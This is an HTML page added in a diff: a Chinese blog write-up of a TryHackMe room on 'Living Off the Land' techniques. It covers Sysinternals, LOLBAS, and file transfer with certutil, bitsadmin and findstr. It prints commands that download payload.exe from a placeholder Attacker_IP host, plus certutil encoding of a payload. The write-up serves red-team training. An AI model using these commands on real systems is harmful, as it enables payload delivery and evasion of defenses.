@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html>
+  <head><meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="generator" content="Hugo 0.124.1">
+<meta name="viewport" content="width=device-width, initial-scale=1" /><meta name="description" content="发掘了解windows" /><title>靠山吃山 | Bad Wichell</title>
+
+<link
+  rel="icon"
+  href="/images/favicon.png"
+  type="image/x-icon"
+/>
+<link
+    rel="stylesheet"
+    rel="preload"
+    type="text/css"
+    href="/css/main.css"
+  /><link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/external/fontawesome.all.min.css"
+    /><link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/external/overlay-scrollbars/overlayscrollbars.min.css"
+    />
+</head>
+  <body onload="browserCompatibility()"><div id="navbarInfo" class="is-hidden modal-container">
+  <div class="modal-content-box modal-text-box">
+    <div class="card modal-title is-radiusless">
+      <div class="card-header">
+        <p class="card-header-title is-marginless">About</p>
+      </div>
+    </div>
+    <div class="modal-content-container">
+      <div class="modal-content-block is-block">
+</div>
+    </div>
+  </div>
+</div>
+<div id="navbarShortcuts" class="is-hidden modal-container">
+  <div class="modal-content-box modal-text-box"><div class="card modal-title is-radiusless">
+        <div class="card-header">
+          <p class="card-header-title is-marginless">Keyboard shortcuts</p>
+        </div>
+      </div>
+      <div class="modal-content-container">
+        <div class="modal-content-block"><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>q</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Show current page QR code</p>
+  </div><div class="modal-content"><kbd>Escape</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Close modals</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>i</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Show website information</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>k</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Show shortcuts</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>h</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Go to homepage</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>f</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Find on website</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>m</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Collapse/Uncollapse sidebar</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>t</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Collapse/Uncollapse table of contents</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>↑</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Go to the top of the page</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>↓</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Go to the bottom of the page</p>
+  </div><div class="modal-content"><kbd>Shift</kbd><p>+</p><kbd>p</kbd></div>
+  <div class="modal-content">
+    <p class="has-text-weight-normal">Print current page</p>
+  </div></div>
+      </div></div>
+</div>
+<div id="modalContainer" class="is-hidden modal-container">
+  <div id="modal" class="modal-content-box"></div>
+</div>
+<nav id="navbar" class="navbar" role="navigation" aria-label="main navigation">
+  <div id="navbarItemsContainer" class="navbar-brand"><div id="globalLogoContainer" class="is-flex">
+  <a
+    id="globalLogo"
+    class="navbar-item navbar-item-standard is-paddingless"
+    href="/"
+  >
+    <img
+      alt="Homepage"
+      src="/images/logo.png"
+    />
+  </a>
+  <a
+    id="globalTouchLogo"
+    class="navbar-item navbar-item-standard is-paddingless"
+    href="/"
+  >
+    <img
+      alt="Homepage"
+      src="/images/logoTouch.png"
+    />
+  </a>
+</div>
+<div id="navbarItems" class="is-flex">
+      <div id="navbarItemsStart" class="is-flex">
+        <div id="searchContainer" class="navbar-item"><div class="control has-icons-left">
+  <span id="searchInput" class="autocomplete">
+    <input
+      id="search"
+      autocomplete="off"
+      class="input"
+      type="search"
+      placeholder="Search"
+    />
+  </span>
+  <span class="icon is-left">
+    <i class="fa-solid fa-magnifying-glass"></i>
+  </span>
+  <ul id="searchList" class="is-paddingless is-hidden"></ul>
+</div>
+</div>
+      </div>
+      <div id="navbarItemsEnd" class="is-flex is-invisible"><div class="navbar-item">
+  <a
+    id="printButton"
+    class="button navbar-item-standard"
+  >
+    <span class="icon-text">Print</span>
+    <span class="icon">
+      <i class="fa-solid fa-print fa-lg"></i>
+    </span>
+  </a>
+</div>
+<div class="navbar-item">
+  <a
+    id="qrCodeButton"
+    class="button navbar-item-standard"
+  >
+    <span class="icon-text">QR code</span>
+    <span class="icon">
+      <i class="fa-solid fa-qrcode fa-lg"></i>
+    </span>
+  </a>
+</div>
+<div class="navbar-item">
+  <a
+    id="shortcutsInfo"
+    trigger="navbarShortcuts"
+    class="button navbar-item-standard navbar-trigger"
+    title="Keyboard shortcuts"
+  >
+    <span class="icon-text">Shortcuts</span>
+    <span class="icon">
+      <i class="fa-solid fa-keyboard fa-lg"></i>
+    </span>
+  </a>
+</div><div class="navbar-item"><div
+  id="taxonomiesSelectorContainer"
+  class="dropdown is-right"
+>
+  <div class="dropdown-trigger">
+    <button
+      id="taxonomiesSelector"
+      class="button navbar-item-standard"
+      aria-haspopup="true"
+      aria-controls="dropdown-menu"
+    >
+      <span class="icon-text">Taxonomies</span>
+      <span class="icon">
+        <i class="fa-solid fa-tags fa-lg"></i>
+      </span>
+    </button>
+  </div>
+  <div
+    id="dropdown-menu-taxonomies"
+    class="dropdown-menu"
+    role="menu"
+  >
+    <div class="dropdown-content is-paddingless"><a
+              href="/categories/"
+              class="dropdown-item has-text-weight-bold"
+            >Categories</a><a
+              href="/tags/"
+              class="dropdown-item has-text-weight-bold"
+            >Tags</a></div>
+  </div>
+</div>
+</div><div class="navbar-item">
+  <a
+    id="siteInfo"
+    trigger="navbarInfo"
+    class="button navbar-item-standard navbar-trigger"
+    title="About"
+  >
+    <span class="icon-text">About</span>
+    <span class="icon">
+      <i class="fa-solid fa-circle-question fa-lg"></i>
+    </span>
+  </a>
+</div>
+<div id="navbarExtend" class="navbar-item">
+  <div id="navbarExtendWrapper">
+    <a id="navbarExtendButton" class="button navbar-item-standard">
+      <span class="icon">
+        <i class="fa-solid fa-ellipsis fa-lg"></i>
+      </span>
+    </a>
+    <div id="navbarExtendItemsContainer">
+      <div id="navbarExtendItemsWrapper"><div class="navbar-item">
+  <a
+    id="printButtonExtend"
+    class="button navbar-item-standard"
+  >
+    <span class="icon-text">Print</span>
+    <span class="icon">
+      <i class="fa-solid fa-print fa-lg"></i>
+    </span>
+  </a>
+</div>
+<div class="navbar-item">
+  <a
+    id="qrCodeButtonExtend"
+    class="button navbar-item-standard"
+  >
+    <span class="icon-text">QR code</span>
+    <span class="icon">
+      <i class="fa-solid fa-qrcode fa-lg"></i>
+    </span>
+  </a>
+</div>
+<div class="navbar-item">
+  <a
+    id="shortcutsInfoExtend"
+    trigger="navbarShortcuts"
+    class="button navbar-item-standard navbar-trigger"
+    title="Keyboard shortcuts"
+  >
+    <span class="icon-text">Shortcuts</span>
+    <span class="icon">
+      <i class="fa-solid fa-keyboard fa-lg"></i>
+    </span>
+  </a>
+</div><div class="navbar-item"><div
+  id="taxonomiesSelectorContainerExtend"
+  class="dropdown is-right"
+>
+  <div class="dropdown-trigger">
+    <button
+      id="taxonomiesSelectorExtend"
+      class="button navbar-item-standard"
+      aria-haspopup="true"
+      aria-controls="dropdown-menu"
+    >
+      <span class="icon-text">Taxonomies</span>
+      <span class="icon">
+        <i class="fa-solid fa-tags fa-lg"></i>
+      </span>
+    </button>
+  </div>
+  <div
+    id="dropdown-menu-taxonomiesExtend"
+    class="dropdown-menu"
+    role="menu"
+  >
+    <div class="dropdown-content is-paddingless"><a
+              href="/categories/"
+              class="dropdown-item has-text-weight-bold"
+            >Categories</a><a
+              href="/tags/"
+              class="dropdown-item has-text-weight-bold"
+            >Tags</a></div>
+  </div>
+</div>
+</div><div class="navbar-item">
+  <a
+    id="siteInfoExtend"
+    trigger="navbarInfo"
+    class="button navbar-item-standard navbar-trigger"
+    title="About"
+  >
+    <span class="icon-text">About</span>
+    <span class="icon">
+      <i class="fa-solid fa-circle-question fa-lg"></i>
+    </span>
+  </a>
+</div>
+</div>
+    </div>
+  </div>
+</div>
+</div>
+    </div>
+  </div>
+</nav>
+<div id="navbarOverlay"></div>
+<div
+      class="columns is-mobile is-paddingless is-marginless"
+      id="mainContainer"
+    ><div
+  id="sidebarContainer"
+  class="column is-narrow is-paddingless is-marginless"
+>
+  <div id="sidebarWrapper" class="is-fixed">
+    <div id="sidebar" class="is-marginless">
+      <aside class="menu is-paddingless is-marginless">
+        <ul class="menu-list is-marginless is-paddingless"><div class="card is-fs-expandable-icon is-sidebar-active"><div class="card-header">
+      <a
+        href='/attack/'
+        class='card-header-title'>
+        <i class='fa-solid fa-ghost fa-lg'></i></a></div>
+      </div><div class="is-expandable">
+      <div class="is-sidebar-list-wrapper"><li class="is-marginless is-tree-active is-entries-expandable is-entries-expanded"><div
+            class="card"><div class="card-header">
+      <a
+        href='/attack/'
+        class='card-header-title'
+          title='Attack'>
+        <i class='fa-solid fa-ghost fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Attack</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
+                <span class='icon'></span>
+              </a>
+            </div>
+          </div><ul class="is-marginless is-tree-active"><div class="">
+      <div class=""><li class="is-marginless is-entries-expandable is-entries-expanded"><div
+            class="card"><div class="card-header">
+      <a
+        href='/attack/tryhackme/'
+        class='card-header-title'
+          title='Tryhackme'>
+        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">Tryhackme</p></a><a class="card-header-icon is-icon-expandable is-paddingless is-icon-expanded">
+                <span class='icon'></span>
+              </a>
+            </div>
+          </div><ul class="is-marginless"><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card is-sidebar-active"id='sidebarActiveEntry'><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/%E9%9D%A0%E5%B1%B1%E5%90%83%E5%B1%B1/'
+        class='card-header-title'
+          title='靠山吃山'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">靠山吃山</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/runtime-detection-evasion/'
+        class='card-header-title'
+          title='Runtime Detection Evasion'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Runtime Detection Evasion</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/attacktive-directory/'
+        class='card-header-title'
+          title='Attacktive Directory'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Attacktive Directory</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/solar-exploting-log4j/'
+        class='card-header-title'
+          title='Solar, exploiting log4j'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Solar, exploiting log4j</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/post-exploitation-basics-%E5%90%8E%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/'
+        class='card-header-title'
+          title='Post-Exploitation Basics'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Post-Exploitation Basics</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/bash-scripting/'
+        class='card-header-title'
+          title='Bash Scripting-TryHackMe'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Bash Scripting-TryHackMe</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/tryhackme/linux-strength-training/'
+        class='card-header-title'
+          title='Linux Strength Training I'>
+        <i class='fa-solid fa-turn-up fa-rotate-90 fa-xs'></i><p class="pt-0 pb-0 pr-2 pl-0">Linux Strength Training I</p></a></div>
+          </div></li>
+      </div>
+    </div></ul></li>
+      </div>
+    </div><div class="">
+      <div class=""><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/attack/hackthebox/'
+        class='card-header-title'
+          title='HackTheBox'>
+        <i class='fa-solid fa-ghost'></i><p class="pt-0 pb-0 pr-2 pl-0">HackTheBox</p></a></div>
+          </div></li>
+      </div>
+    </div></ul></li>
+      </div>
+    </div><div class="card is-fs-expandable-icon"><div class="card-header is-single-link">
+      <a
+        href='/tools/'
+        class='card-header-title'>
+        <i class='fa-solid fa-hammer fa-lg'></i></a></div>
+      </div><div class="is-expandable">
+      <div class="is-sidebar-list-wrapper"><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/tools/'
+        class='card-header-title'
+          title='Tools'>
+        <i class='fa-solid fa-hammer fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Tools</p></a></div>
+          </div></li>
+      </div>
+    </div><div class="card is-fs-expandable-icon"><div class="card-header is-single-link">
+      <a
+        href='/sitemap/'
+        class='card-header-title'>
+        <i class='fa-solid fa-sitemap fa-lg'></i></a></div>
+      </div><div class="is-expandable">
+      <div class="is-sidebar-list-wrapper"><li class="is-marginless"><div
+            class="card"><div class="card-header is-single-link">
+      <a
+        href='/sitemap/'
+        class='card-header-title'
+          title='Sitemap'>
+        <i class='fa-solid fa-sitemap fa-lg'></i><p class="pt-0 pb-0 pr-2 pl-1">Sitemap</p></a></div>
+          </div></li>
+      </div>
+    </div></ul>
+      </aside>
+    </div>
+    <div id="sidebarCollapsible" class="is-marginless">
+      <div class="card is-uncollapse-action">
+        <div
+          id="sidebarUncollapse"
+          class="card-header is-single-link"
+          title="Collapse/Uncollapse sidebar"
+        >
+          <a class="card-header-title">
+            <i class="fa-solid fa-angles-right fa-lg"></i>
+          </a>
+        </div>
+      </div>
+      <div class="card is-collapse-action">
+        <div
+          id="sidebarCollapse"
+          class="card-header is-single-link"
+          title="Collapse/Uncollapse sidebar"
+        >
+          <a class="card-header-title">
+            <i class="fa-solid fa-angles-left fa-lg"></i>
+            <p>Collapse sidebar</p>
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div id="sidebarMobileWrapper" class="column is-narrow is-hidden-desktop"></div>
+<div class="columns is-mobile is-marginless is-scroll-smooth has-toc" id="contentContainer">
+  <div class="column" id="content"><div id="contentTitle">靠山吃山</div>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240402072213.png"
+  alt=""
+  class=""/>
+</p>
+<table>
+<thead>
+<tr>
+<th>房间名称</th>
+<th><a
+  href="https://tryhackme.com/r/room/monitoringevasion"
+    class="is-pretty-link">https://tryhackme.com/r/room/monitoringevasion</a
+>
+</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>描述</td>
+<td>靠山吃山</td>
+</tr>
+<tr>
+<td>难度</td>
+<td>中等</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>BadWiChell</td>
+</tr>
+</tbody>
+</table>
+<h1 id='任务一'>任务一<a href='#%e4%bb%bb%e5%8a%a1%e4%b8%80' class='anchor'>#</a>
+</h1><h2 id='介绍'>介绍<a href='#%e4%bb%8b%e7%bb%8d' class='anchor'>#</a>
+</h2><p>Living Off the Land 是红队社区的一个热门术语。这个名字取自现实生活，靠吃土地上可用的食物为生。同样，攻击者和恶意软件创建者会利用目标计算机的内置工具和实用程序。2013 年，DerbyCon3 上引入了“Living Off the Land”一词，此后在红队社区中获得了更多的关注，成为一种常用和流行的技术。</p>
+<p>这些内置工具在目标系统或网络功能中执行各种常规活动;但是，它们越来越多地被使用和滥用，例如，使用 CertUtil 工具将恶意文件下载到目标计算机中。</p>
+<p>主要思想是使用 Microsoft 签名的程序、脚本和库来融入和规避防御性控制。红队成员在对目标执行交战活动时不希望被发现，因此使用这些工具可以更安全地保持隐身。</p>
+<p>以下是生活在陆地上所包含的一些类别：</p>
+<ul>
+<li> 识别</li>
+<li> 文件操作</li>
+<li> 任意代码执行</li>
+<li> 横向移动</li>
+<li> 安全产品旁路</li>
+</ul>
+<p> 学习目标</p>
+<ul>
+<li>了解红队参与的“生活在土地上”一词。</li>
+<li>了解 LOLBAS 项目及其使用方法。</li>
+<li>了解并应用红队参与中使用的技术。</li>
+</ul>
+<p> 会议室先决条件</p>
+<ul>
+<li> 一般黑客技术的基本知识。</li>
+<li> 完成 Jr. 渗透测试器学习路径。</li>
+<li>TryHackMe Red Team 初始访问模块.</li>
+</ul>
+<h1 id='任务二'>任务二<a href='#%e4%bb%bb%e5%8a%a1%e4%ba%8c' class='anchor'>#</a>
+</h1><h2 id='windows-内部系统'>windows 内部系统<a href='#windows-%e5%86%85%e9%83%a8%e7%b3%bb%e7%bb%9f' class='anchor'>#</a>
+</h2><p>Windows Sysinternals 是一组工具和高级系统实用工具，旨在帮助 IT 专业人员在各种高级主题中管理、疑难解答和诊断 Windows 操作系统。</p>
+<p>Sysinternals 套件分为多个类别，包括：</p>
+<ul>
+<li> 磁盘管理</li>
+<li> 流程管理</li>
+<li> 网络工具</li>
+<li> 系统信息</li>
+<li> 安全工具</li>
+</ul>
+<p>为了使用 Windows Sysinternals 工具，我们需要接受这些工具的 Microsoft 许可协议。我们可以通过在命令提示符下传递 -accepteula 参数或在工具执行期间通过 GUI 来做到这一点。</p>
+<p>以下是一些常用的 Windows Sysinternals 工具：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk"
+    class="is-pretty-link">AccessChk（访问Chk）</a
+>
+</td>
+<td>帮助系统管理员检查文件、目录、注册表项、全局对象和 Windows 服务的指定访问权限.</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec"
+    class="is-pretty-link">PsExec</a
+>
+</td>
+<td>在远程系统上执行程序的工具.</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer"
+    class="is-pretty-link">ADExplorer</a
+>
+</td>
+<td>一种高级 Active Directory 工具，有助于轻松查看和管理 AD 数据库。</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"
+    class="is-pretty-link">ProcDump （处理器转储）</a
+>
+</td>
+<td>监视正在运行的进程是否存在 CPU 峰值，以及转储内存以进行进一步分析的能力。</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon"
+    class="is-pretty-link">ProcMon</a
+>
+</td>
+<td>过程监控的重要工具.</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview"
+    class="is-pretty-link">TCPView</a
+>
+</td>
+<td>列出所有 TCP 和 UDP 连接的工具。</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools"
+    class="is-pretty-link">PsTools的</a
+>
+</td>
+<td>在 Sysinternals 套件中设计的第一个工具，用于帮助列出详细信息。</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/portmon"
+    class="is-pretty-link">portmon</a
+>
+</td>
+<td>监视和显示系统上的所有串行和并行端动。</td>
+</tr>
+<tr>
+<td><a
+  href="https://docs.microsoft.com/en-us/sysinternals/downloads/whois"
+    class="is-pretty-link">Whois</a
+>
+</td>
+<td>提供指定域名或 IP 地址的信息。</td>
+</tr>
+</tbody>
+</table>
+<h2 id='sysinternals-实时'>Sysinternals 实时<a href='#sysinternals-%e5%ae%9e%e6%97%b6' class='anchor'>#</a>
+</h2><p>Windows Sysinternals 的一大特点是无需安装。Microsoft 提供 Windows Sysinternals 服务 Sysinternals live，其中包含使用和执行这些工具的各种方法。我们可以通过以下方式访问和使用它们：</p>
+<ul>
+<li> Web 浏览器（链接）。</li>
+<li> Windows 共享</li>
+<li> 命令提示符</li>
+</ul>
+<p>若要使用这些工具，请下载它们，或者在 Windows 资源管理器中输入 Sysinternal Live 路径 \live.sysinternals.com\tools。</p>
+<p><img
+  src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png"
+  alt=""
+  class=""/>
+</p>
+<h1 id='任务三'>任务三<a href='#%e4%bb%bb%e5%8a%a1%e4%b8%89' class='anchor'>#</a>
+</h1><h2 id='lolbas-项目'> LOLBAS 项目<a href='#lolbas-%e9%a1%b9%e7%9b%ae' class='anchor'>#</a>
+</h2><p>什么是LOLBAS？</p>
+<p>LOLBAS 代表 Living Off the Land Binaries And Scripts，项目的主要目标是收集和记录用作 Living Off the Land 技术的 Microsoft 签名和内置工具，包括二进制文件、脚本和库。</p>
+<p><img
+  src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c98596d3c51c192ae9fd415ff06fc6b9.png"
+  alt=""
+  class=""/>
+</p>
+<p>The LOLBAS project is a community-driven repository gathering a collection of binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&amp;CK info. The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project&rsquo;s website <a
+  href="https://lolbas-project.github.io/"
+    class="is-pretty-link">here</a
+>
+.</p>
+<p>ROLBAS网站提供了一个方便的搜索栏来查询所有可用数据。查找二进制文件很简单;包括二进制名称将显示结果。但是，如果我们想查找特定函数，则需要在函数名称之前提供 /。例如，如果我们要查找所有执行函数，我们应该使用 /execute 同样，为了基于类型进行查找，我们应该使用 # 符号后跟类型名称。以下是项目中包含的类型：</p>
+<ul>
+<li> 脚本</li>
+<li> 二元的</li>
+<li> 图书馆</li>
+<li> 其他MSBinaries</li>
+</ul>
+<p> 工具标准</p>
+<p>要使工具成为“在陆地上生活”技术并被接受为LOLBAS项目的一部分，需要特定的标准：</p>
+<ul>
+<li>
+<p>操作系统原生的 Microsoft 签名文件或从 Microsoft 下载的文件。</p>
+</li>
+<li>
+<p>具有已知用例未涵盖的其他有趣的意外功能。</p>
+</li>
+<li>
+<p>有利于 APT（高级持续威胁）或红队参与。</p>
+</li>
+</ul>
+<p>请注意，如果您发现符合上述标准的令人兴奋的二进制文件，您可以通过访问 GitHub 存储库贡献页面来提交您的发现以获取更多信息。<br>
+LOLBAS 项目接受符合以下功能之一的工具提交：</p>
+<ul>
+<li>
+<p> 任意代码执行</p>
+</li>
+<li>
+<p>文件操作，包括下载、上传和复制文件。</p>
+</li>
+<li>
+<p> 编译代码</p>
+</li>
+<li>
+<p>持久性，包括在备用数据流 （ADS） 中隐藏数据或在登录时执行。</p>
+</li>
+<li>
+<p> UAC 旁路</p>
+</li>
+<li>
+<p> 转储进程内存</p>
+</li>
+<li>
+<p> DLL 注入</p>
+</li>
+</ul>
+<h1 id='任务四'>任务四<a href='#%e4%bb%bb%e5%8a%a1%e5%9b%9b' class='anchor'>#</a>
+</h1><h2 id='文件操作'>文件操作<a href='#%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c' class='anchor'>#</a>
+</h2><p><strong>Certutil</strong></p>
+<p>Certutil 是用于处理认证服务的 Windows 内置实用程序。它用于转储和显示证书颁发机构 （CA） 配置信息和其他 CA 组件。因此，该工具的正常用途是检索证书信息。但是，人们发现certutil.exe可以传输和编码与认证服务无关的文件。MITRE ATT&amp;CK 框架将此技术标识为 Ingress 工具传输 （T1105）。
+为了通过一个示例来说明这一点，我们可以使用 certutil.exe 从攻击者的 Web 服务器下载文件，并使用以下命令将其存储在 Windows 的临时文件夹中。请注意，我们使用 the-urlcache 和 -split -f 参数来强制工具使用拆分技术从提供的 URL 下载。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+</span></span></code></pre></div><p>-urlcache-urlcache 显示 URL，启用要在命令中使用的 URL 选项<br>
+-split -f 拆分并强制从提供的 URL 获取文件。<br>
+此外，certutil.exe 可以用作编码工具，我们可以在其中对文件进行编码和解码文件的内容。ATT&amp;CK T1027 是指这种技术对文件进行混淆处理，使其难以发现或分析。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt; certutil -encode payload.exe Encoded-payload.txt
+</span></span></code></pre></div><p>有关该工具的详细信息，您可以在此处访问 Microsoft 文档：Microsoft 文档：CertUtil</p>
+<p><strong>BITSAdmin</strong></p>
+<p>bitsadmin 工具是一个系统管理员实用程序，可用于创建、下载或上传后台智能传输服务 （BITS） 作业并检查其进度。BITS 是一种低带宽和异步方法，用于从 HTTP Web 服务器和 SMB 服务器下载和上传文件。有关 bitsadmin 工具的其他信息，请参阅 Microsoft Docs.</p>
+<p>攻击者可能会滥用 BITS 作业在受感染的计算机中下载并执行恶意负载。有关此技术的更多信息，您可以访问 ATT&amp;CK T1197 页面。</p>
+<p>介绍码头集装箱内容（重访）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt;bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+</span></span></code></pre></div><p>/Transfer 以使用传输选项</p>
+<p>/Download 我们指定使用下载类型的传输</p>
+<p>/优先级 我们正在设置作业的优先级，以便在前台运行</p>
+<p>有关 bitsadmin 参数的详细信息，您可以访问该工具的 Microsoft 文档。</p>
+<p><strong>查找链</strong></p>
+<p>Findstr 是 Microsoft 内置工具，用于查找文件中的文本和字符串模式。findstr 工具非常有用，可以帮助用户和系统管理员在文件或解析输出中进行搜索。例如，如果我们想检查我们的机器上是否打开了端口 8080，那么我们可以通过管道传递 netstat 的结果以找到该端口，如下所示： netstat -an|findstr “445”.</p>
+<p>但是，通过使用 findstr.exe 从网络内的 SMB 共享文件夹下载远程文件，发现了一种意外方法，如下所示,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt;findstr /V dummystring \\MachineName\ShareFolder\test.exe &gt; c:\Windows\Temp\test.exe
+</span></span></code></pre></div><p>/V 打印出不包含所提供字符串的行。</p>
+<p>dummystring 要搜索的文本;在这种情况下，我们提供了一个不能在文件中找到的字符串。</p>
+<blockquote>
+<p>c：\Windows\Temp\test.exe 将输出重定向到目标计算机上的文件。</p>
+</blockquote>
+<p>请注意，其他工具可用于文件操作。我们建议访问 LOLBASproject 查看它们。</p>
+<h3 id='问答'>问答<a href='#%e9%97%ae%e7%ad%94' class='anchor'>#</a>
+</h3><pre tabindex="0"><code>问：运行 bitsadmin.exe 将所选文件下载到附加的 Windows VM 上。成功执行命令后，将在桌面上自动创建一个编码的标志文件。文件名是什么？
+</code></pre><p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403171305.png"
+  alt=""
+  class=""/>
+
+根据 Bitsadmin 工具使用提示，在机器上创建 txt 文件进行传输即可。</p>
+<pre tabindex="0"><code>问：使用 certutil.exe 工具解码问题 #1 中的编码标志文件。为了解码文件，我们使用 -decode   
+</code></pre><p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403171852.png"
+  alt=""
+  class=""/>
+
+首先第一步使用 certutil 工具的解密参数，第二步指定加密文件所在的目录选择 txt 文件，第三步生成解密后输出文件即可。</p>
+<h1 id='任务五'>任务五<a href='#%e4%bb%bb%e5%8a%a1%e4%ba%94' class='anchor'>#</a>
+</h1><h2 id='文件执行'>文件执行<a href='#%e6%96%87%e4%bb%b6%e6%89%a7%e8%a1%8c' class='anchor'>#</a>
+</h2><p>此任务显示了在操作系统中执行二进制文件的各种方法。执行二进制文件的典型情况涉及各种已知方法，例如 cmd.exe 或从桌面使用命令行。但是，存在其他方法可以通过滥用其他系统二进制文件来实现有效负载执行，其中一个原因是隐藏或强化有效负载的进程。基于 MITRE ATT&amp;CK 框架，此技术称为签名二进制代理执行或间接命令执行，攻击者利用其他系统工具生成恶意负载。这种技术还有助于逃避防御控制。</p>
